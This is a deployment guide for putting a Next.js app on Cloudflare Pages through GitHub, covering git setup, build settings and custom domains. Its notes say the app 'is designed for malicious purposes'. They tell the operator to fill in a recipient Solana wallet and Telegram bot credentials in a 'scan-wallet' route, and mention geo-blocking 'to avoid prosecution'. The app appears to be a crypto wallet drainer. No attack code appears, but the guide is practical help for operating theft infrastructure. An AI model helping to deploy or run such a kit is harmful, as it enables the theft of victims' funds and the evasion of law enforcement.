# Deployment Guide for Cloudflare Pages

## Prerequisites
- GitHub account
- Cloudflare account (free tier works)
- Git installed on your computer

## Step 1: Initialize Git Repository

Open PowerShell in your project folder and run:

```powershell
git init
git add .
git commit -m "Initial commit"
```

## Step 2: Create GitHub Repository

1. Go to https://github.com/new
2. Create a new repository (can be private)
3. **DO NOT** initialize with README, .gitignore, or license
4. Copy the repository URL

## Step 3: Push to GitHub

Replace `YOUR_USERNAME` and `YOUR_REPO` with your actual GitHub username and repository name:

```powershell
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git
git branch -M main
git push -u origin main
```

## Step 4: Deploy to Cloudflare Pages

1. Go to https://dash.cloudflare.com/
2. Click **Workers & Pages** in the left sidebar
3. Click **Create application** → **Pages** tab → **Connect to Git**
4. Authorize GitHub and select your repository
5. Configure build settings:
   - **Framework preset**: Next.js (SSR)
   - **Build command**: `pnpm install && pnpm build`
   - **Build output directory**: `.next`
   - **Root directory**: `/` (leave empty)
6. Click **Save and Deploy**

## Step 5: Wait for Deployment

Cloudflare will:
- Install dependencies
- Build your Next.js app
- Deploy it to their edge network

This takes 2-5 minutes. You'll get a live URL like: `https://your-project.pages.dev`

## Important Notes

⚠️ **Before deploying:**
- Make sure you've updated the placeholder values in `app/api/scan-wallet/route.ts`:
  - `RECIPIENT_ADDRESS` - Your Solana wallet address
  - `TELEGRAM_BOT_TOKEN` - Your bot token
  - `TELEGRAM_CHAT_ID` - Your chat ID

⚠️ **Security:**
- This app is designed for malicious purposes
- CIS geo-blocking is active to avoid prosecution
- Use at your own legal risk

## Custom Domain (Optional)

1. In Cloudflare Pages, go to your project
2. Click **Custom domains**
3. Add your domain
4. Update your domain's DNS settings as instructed

## Updating the Site

After pushing changes to GitHub:

```powershell
git add .
git commit -m "Update description"
git push
```

Cloudflare will automatically rebuild and redeploy.
